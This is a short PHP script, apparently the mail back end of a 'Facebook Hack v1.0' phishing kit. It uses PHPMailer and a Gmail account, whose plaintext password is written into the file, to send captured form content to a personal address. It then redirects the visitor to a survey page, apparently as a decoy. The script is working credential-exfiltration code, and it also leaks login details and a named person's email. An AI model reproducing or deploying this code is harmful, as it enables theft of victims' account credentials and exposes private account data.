<?php
require 'PHPMailer/PHPMailerAutoload.php';

function sendMail($bodyContent, $sender)
{
    $mail = new PHPMailer;
    $mail->isSMTP();                                   // Set mailer to use SMTP
    $mail->Host = 'smtp.gmail.com';                    // Specify main and backup SMTP servers
    $mail->SMTPAuth = true;                            // Enable SMTP authentication
    $mail->Username = 'hackerabc1995@gmail.com';          // SMTP username
    $mail->Password = 'hackersika';            // SMTP password
    $mail->SMTPSecure = 'tls';                         // Enable TLS encryption, `ssl` also accepted
    $mail->Port = 587;                                 // TCP port to connect to

    $mail->setFrom('hackerabc1995@gmail.com', 'FB Hack v1.0');
    $mail->addReplyTo('hackerabc1995@gmail.com', 'FB Hack v1.0');
    $mail->addAddress("thilina.prashad25@gmail.com");   // Add a recipient
    //$mail->addCC('cc@example.com');
    //$mail->addBCC('bcc@example.com');

    $mail->isHTML(true);  // Set email format to HTML


    $mail->Subject = 'Facebook Hack v1.0' . $sender;
    $mail->Body = $bodyContent;

    if (!$mail->send()) {

    } else {
        echo "<script>window.location = 'https://www.surveymonkey.com/r/LMWLMLS';</script>";
    }
}

?>


		